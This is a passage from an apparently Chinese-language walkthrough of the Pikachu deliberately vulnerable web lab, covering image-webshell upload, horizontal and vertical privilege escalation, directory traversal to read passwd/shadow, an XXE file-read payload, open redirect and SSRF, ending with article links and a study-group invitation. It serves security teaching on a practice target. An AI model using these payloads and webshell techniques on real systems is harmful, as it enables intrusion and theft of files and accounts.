> 方法一、直接伪造头部GIF89A 方法二、制作图片马，配合文件包含漏洞进行漏洞利用 CMD中输入命令: copy /b 1.jpg + shellweb.php upload.jpg   
 进行图片与一句话木马的捆绑，然后进行上传，之后再文件包含漏洞界面利用php伪协议进行图片马执行，获取shell  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wp9pXoia8D4ia3zCpsfWvOrfq76tNM6fAI4ctPog5XBRGYR2zKFyz5tRQ/640?wx_fmt=png&from=appmsg "")  
## 九、Over Permission(越权)  
### 9.1 水平越权  
  
**点击提示查看账号,lucy、lili、kobe三个账号,观察URL发现存在一个username参数并且恰好对应着我们登录的kobe账号，尝试对username进行修改，username=lucy,发现个人信息会显示成lucy账号的信息，存在同级水平越权**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wMGmBuhOG8kgs8RicGPGRAZUt1uHDiaianXBgOSrKkQ2I89DA36XsfLw7Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wboCTDciakOykaSlGgx3tiaFEicDrTgfz6up47dcmz1bvYJ5Tm2XeCeZJQ/640?wx_fmt=png&from=appmsg "")  
### 9.2 垂直越权  
  
先看提示的账户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wI66vYYDleJFPNkFsuydLERql2gcDwBMDfxzBdusr1owblnZnmFYUQg/640?wx_fmt=png&from=appmsg "")  
  
先登录pikachu账号，发现只有查看权限，并且URL中也并没有存在什么可利用的信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wlJHvqCGmReN9vYJAqjmmNOO6XbYhjFUqdHEZOs1XjBRF1kBItRZSvQ/640?wx_fmt=png&from=appmsg "")  
  
再登录admin管理员账号,发现URL出有变化，普通用户是op2_user.oho页面，管理员是op2_admin.php页面，那就尝试用普通用户或管理员用户修改URL进入页面，看看是否会造成越权。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wmKicR2WUOCDN6EnWTqZygicIyJxicuxfeEAcbJMK5qFIgpRzxb0Rjtwbw/640?wx_fmt=png&from=appmsg "")  
  
利用普通用户修改成admin会重定向回login页面，但是用管理员用户修改成user则会直接跳转成普通用户。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wCn4RJdBPhn27K6ibZqyibRjDhibvqHclRbicicbqTw04nJicVvYZHQRR0YPQ/640?wx_fmt=png&from=appmsg "")  
  
那只能去看admin用户执行增加用户操作时会不会产生越权，发现URL中文件为op2_admin_edit.php,尝试使用普通用户访问。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wzfpIJZHBIVNnmwLc0WqXqykuAQhqfktNgsYGKZ8c3ELxDEnp7j5bkw/640?wx_fmt=png&from=appmsg "")  
  
使用pikachu用户访问发现，可以进行跳转并且进行可以执行用户添加操作，存在垂直越权漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wImv1EkMu33IvVQReQWcbfLKEIYXrVdX1lA4oYEDeWO69QiafFCuOIjg/640?wx_fmt=png&from=appmsg "")  
## 十、目录遍历  
### 10.1 目录遍历漏洞  
  
利用可控的文件名进行任意文件访问  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8waTapKlt2RViaFQf3URng2nB9VTUJP2MMoF9omtSWmVFmXib3uUSNVakg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wibA5DVPUkHkQdDkxZxgQY9varJxpiaKpyxNlvibxhzvJlMVLZheVicGNgg/640?wx_fmt=png&from=appmsg "")  
  
直接进行passwd或shadows的访问  
## 十一、敏感信息泄露  
### 11.1 IcanseeyouABC  
  
根据题目名字查看abc,将路径修改改为abc.php可以将同目录下的该文件进行查看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8waqKqXJNXGPXv6BPX2ZvogFVju7lMfdibJeGQWPicAYLhwZ4K5DyhX73w/640?wx_fmt=png&from=appmsg "")  
## 十二、XXE  
### 12.1 XXE漏洞(xml外部实体注入)  
  
libxml<libxml2.9 不支持外部实体  libxml版本可以在phpinfo中查看  
简单检测 <gg>gg</gg>  
,返回gg字符,存在漏洞且具有回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wrrMxYvKms4sQMAxj6nh0hqwwPXVicKbTGNG0oEgQtiag1MGBh66LXO3Q/640?wx_fmt=png&from=appmsg "")  
  
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xdsec [<!ELEMENT methodname ANY ><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=phpinfo.php" >]> <methodcall> <methodname>&xxe;</methodname> </methodcall>  
利用伪协议进行文件读取。  
## 十三、URL重定向  
### 13.1 URL跳转  
  
出现在URL跳转的地方，如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生"跳错对象"的问题  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wHRvC6Oujjvg5ibCiaXDNia0sE1gkOibxZL8MZWAblYzpaXZk8wjjEqqp4Q/640?wx_fmt=png&from=appmsg "")  
  
利用该构造的URL，就会跳转到百度搜索页面，当然这个漏洞如果被攻击者发现可能就会被用来跳转到其搭建的钓鱼网站中。  
## 十四、SSRF  
### 14.1 SSRF(curl)  
> ❝  
> PHP中下面函数的使用不当会导致SSRF: file_get_contents() fsockopen() curl_exec()  
  
  
攻击者输入的地址会让服务器进行发起请求，并返回得到的数据，简单来说就是利用服务器的权限去请求一些其他的非法内容。 这里可以直接看到URL，尝试修改http://192.168.3.245/pikachu-master/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wkuAvdb1Qw9XicszibXibXjd1DXuQD0ZSB7zAEibOoKFP4MS3PlZ0o9YP5g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wKy2dHefib3ZW6a8MRA0WKxIXmyTrgiaOFs6hftTsdNZzzgTnXIaaibSDw/640?wx_fmt=png&from=appmsg "")  
### 14.2 SSRF(file_get_content)  
  
点击显示内容，在URL中发现file参数，可以利用伪协议进行本地文件读取也可以进行源码查看。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w2hjhV4knadSyAepKfERZhpyCCCmetCbjDbSShAsQ7QDDvQkP1J5gKQ/640?wx_fmt=png&from=appmsg "")  
  
读取之后发现源码被加密，但看着像是Base64加密，拿去进行解密直接拿到源代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wGNrFTPJzAs0ZOpFqxqiabJuX0m9crAO8acKONAxV0WICMckvxBkjWjg/640?wx_fmt=png&from=appmsg "")  
### pikachu靶场：  
  
https://github.com/zhuifengshaonianhanlu/pikachu  
### 文章精选  
  
[SQLmap自动化SQL注入攻击神器---满满干货知识！！](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485353&idx=1&sn=5bc0ed4180bfcd45c8ddaf3f7dc2716c&scene=21#wechat_redirect)  
  
  
[FOFA搜索引擎语法---信息收集篇](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485322&idx=1&sn=30ebbff69ae793676247af3791e49cd9&scene=21#wechat_redirect)  
  
  
[渗透测试浏览器插件整合包---谁能拒绝页面上一排的小助手呢？](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485231&idx=1&sn=d62dc6a72f2f5902e7170a1b94f2a987&scene=21#wechat_redirect)  
  
  
[ATT&CK 网络攻击战术中文手册分享---看不懂英文版就来看中文版！](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485245&idx=1&sn=cfb5d014668fdd19df4a0481e7901a42&scene=21#wechat_redirect)  
  
  
[【zpscan】综合了各大常用信息收集工具---目前更新POC/EXP模块](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485038&idx=1&sn=9790b6905dd0f61eebc2959069fb8514&scene=21#wechat_redirect)  
  
  
[想空余时间搞个副业？流量变现躺着赚钱！---详细教学篇](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247484940&idx=1&sn=bd631453307de31c02cb50d6127f601d&scene=21#wechat_redirect)  
  
  
[网安行业含金量高的证书【OSCP+】---Offensive Security官方认证](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247484758&idx=1&sn=d8b00fade4a06a8fbe455da47ebf10c6&scene=21#wechat_redirect)  
  
### 学习交流群  
  
**学习交流群**  
创建啦，**学习网络安全**  
遇到困难怎么办？那就加入我们吧，**群里大佬**  
为你解答，**互相交流**  
、**互相成长**  
，让我们成为网络安全道路上的**同行者**  
，与互相的**见证者**  
！  
  
群链接在**公众号主页**  
，如果链接过期了或有什么问题在后台通知我就行了！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wib1vA40lsEmCOATJNUSvuJWSHSdbqqwW5X7BJDKv6YFZ0dI6c71iaEEQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
